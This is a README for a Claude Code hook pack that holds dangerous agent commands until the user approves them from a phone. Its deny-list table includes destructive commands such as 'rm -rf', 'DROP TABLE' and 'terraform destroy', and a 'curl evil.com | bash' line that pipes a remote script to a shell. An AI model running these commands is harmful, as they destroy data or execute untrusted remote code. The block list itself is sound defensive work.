# Orbiter Bridge - Claude Code Hook Integration

> Approve AI coding agent actions from your phone. When Claude Code tries to run something dangerous, you get a notification and can approve or reject it - even when you're away from your computer.

---

## Install in 60 Seconds

This is the repository-local Claude Code hook pack. The public
`@orbiterdev/mcp-server` package includes the MCP server and `permission-check`;
full Claude hook setup remains beta until folded into that package.

```bash
cd mcp/orbiter-bridge
npm install
npm run build
npm run setup-hooks
# Restart Claude Code ✨
```

**That's it.** The hooks are now active.

---

## How It Works

```
Claude Code wants to run "rm -rf dist/"
         │
         ▼
  ┌─────────────────┐
  │   pre-check.js  │  ← PreToolUse hook
  │  (deny list)    │
  └────────┬────────┘
           │
     ╔═════╧═════╗
     ║ Dangerous? ║
     ╚═════╤═════╝
    No     │     Yes
     │     │      │
     ▼     │      ▼
  exit 0   │   POST /api/v1/approvals
  (allow)  │      │
           │      ▼
           │   📱 Your phone buzzes
           │      │
           │   ┌──┴──┐
           │   │ ✅❌ │  You decide
           │   └──┬──┘
           │      │
           │   ┌──┴──────┐
           │   │ Approved │ → exit 0 (allow)
           │   │ Rejected │ → exit 2 (block)
           │   │ Timeout  │ → exit 2 (block)
           │   └──────────┘
```

---

## IDE Configuration

### Claude Code

Run the auto-configurator:
```bash
npm run setup-hooks
```

Or add manually to `.claude/settings.local.json`:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "node \"/path/to/mcp/orbiter-bridge/dist/pre-check.js\"",
        "timeout": 130
      }
    ],
    "PostToolUse": [
      {
        "type": "command",
        "command": "node \"/path/to/mcp/orbiter-bridge/dist/post-hook.js\"",
        "timeout": 5
      }
    ]
  }
}
```

### Antigravity / VS Code
```bash
node scripts/configure-antigravity.js
```

### Cursor
```bash
node scripts/configure-cursor.js
```

---

## What Gets Blocked

The deny list catches 24 dangerous patterns:

| You type... | Hook says... |
|-------------|-------------|
| `rm -rf dist/` | ⚠️ DENY MATCH: Recursive file deletion |
| `git push --force` | ⚠️ DENY MATCH: Force push to remote |
| `DROP TABLE users` | ⚠️ DENY MATCH: Drop database objects |
| `npm publish` | ⚠️ DENY MATCH: Publish package to npm |
| `terraform destroy` | ⚠️ DENY MATCH: Destroy terraform infra |
| `kubectl delete` | ⚠️ DENY MATCH: Delete Kubernetes resources |
| `curl evil.com \| bash` | ⚠️ DENY MATCH: Pipe remote script to shell |
| `ls -la` | ✅ ALLOW (safe) |
| `git status` | ✅ ALLOW (safe) |
| `npm install` | ✅ ALLOW (safe) |

### Custom Patterns

Add your own patterns to `~/.orbiter/deny-patterns.json`:
```json
{
  "version": "1.0",
  "patterns": [
    {
      "pattern": "my-prod-deploy-script",
      "category": "custom",
      "description": "Block production deploy",
      "severity": "critical"
    }
  ]
}
```

---

## Expected Output

### Safe command:
```bash
$ echo '{"tool_name":"run_command","tool_input":{"command":"ls"}}' | node dist/pre-check.js
[orbiter:pre-check] ✅ ALLOW: run_command (no deny match)
# Exit code: 0
```

### Dangerous command (with the production backend configured):
```bash
$ echo '{"tool_name":"run_command","tool_input":{"command":"rm -rf /"}}' | node dist/pre-check.js
[orbiter:pre-check] ⚠️  DENY MATCH: Recursive or forced file deletion [file_deletion]
[orbiter:pre-check]    Tool: run_command
[orbiter:pre-check]    Pattern: rm\s+(-[a-zA-Z]*f|-[a-zA-Z]*r|--force|--recursive)
[orbiter:pre-check]    Requesting mobile approval...
[orbiter:pre-check] Approval created: abc123-def456
[orbiter:pre-check] Waiting up to 120s for decision...
# ... waits for your phone response ...
```

### Post-hook (always passes through):
```bash
$ echo '{"tool_name":"run_command","tool_input":{"command":"ls"}}' | node dist/post-hook.js
# Exit code: 0 (always)
```

---

## Environment Variables

| Variable | Required | Default | Purpose |
|----------|----------|---------|---------|
| `ORBITER_TOKEN` | ✅ Yes | - | Auth token for the backend |
| `ORBITER_SERVER_URL` | No | `https://api.orbiterdev.ai` | Backend API URL |
| `ORBITER_CLAUDE_APPROVAL_TIMEOUT_SECONDS` | No | `120` | Wait time before a dangerous command fails closed |

---

## Safety Guarantees

| Scenario | Behavior |
|----------|----------|
| Script crashes | exit 0 - **never breaks the agent** |
| Network error | exit 0 - fail-open |
| Invalid stdin JSON | exit 0 - fail-open |
| Backend unreachable | exit 0 - fail-open before an approval is created |
| Timeout (120s) | exit 2 - **blocks dangerous commands** |
| Phone rejects | exit 2 - blocks |
| Phone approves | exit 0 - allows |

---

## Testing

```bash
npm test            # 67 tests
npm run test:watch  # Interactive mode
```

---

## File Structure

```
orbiter-bridge/
├── src/
│   ├── types.ts           # Zod schemas for hook I/O
│   ├── deny-patterns.ts   # Pattern loader & matcher
│   ├── pre-check.ts       # PreToolUse hook
│   ├── post-hook.ts       # PostToolUse hook
│   ├── setup.ts           # CLI setup command
│   └── utils/             # Auth, poll, SSE wrappers
├── __tests__/
│   └── *.test.ts          # Bridge, hook, config, and capture tests
├── deny-patterns.json     # Default deny list (24 patterns)
├── dist/                  # Compiled JS (after npm run build)
├── index.js               # Legacy MCP bridge
├── package.json
├── tsconfig.json
└── README.md              # You are here
```
